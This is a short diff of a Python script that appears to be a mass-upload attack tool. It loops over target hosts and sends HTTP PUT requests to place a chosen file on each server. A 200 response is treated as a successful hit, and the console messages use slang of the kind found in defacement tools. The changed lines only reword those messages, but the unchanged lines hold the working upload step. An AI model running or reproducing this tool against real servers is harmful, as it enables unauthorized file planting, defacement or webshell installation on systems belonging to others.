@@ -31,13 +31,13 @@ while True:
  if not host.startswith('http'):
   host = 'http://' + host
  outname = '/'+sys.argv[2]
- print('\033[34;1m[*]\033[0m Sending Files         : '+sys.argv[2])
- print('\033[34;1m[*]\033[0m Size File             : '+str(len(scheker)))
+ print('\033[34;1m[*]\033[0m Uploud Files Cuks     : '+sys.argv[2])
+ print('\033[34;1m[*]\033[0m Size File Cuks        : '+str(len(scheker)))
  print('\033[34;1m[*]\033[0m Scanning Target Cuks  : '+host)
  try:
     r = requests.request('put', host + outname, data=scheker, headers={'Content-Type':'application/octet-stream'})
  except:
-    print('\033[31;1m[-]\033[0m Not Vuln Cuks      : Null Respone\n')
+    print('\033[31;1m[-]\033[0m Not Vuln Cuks          : Null Respone\n')
     pass
     continue
  if r.status_code == 200:
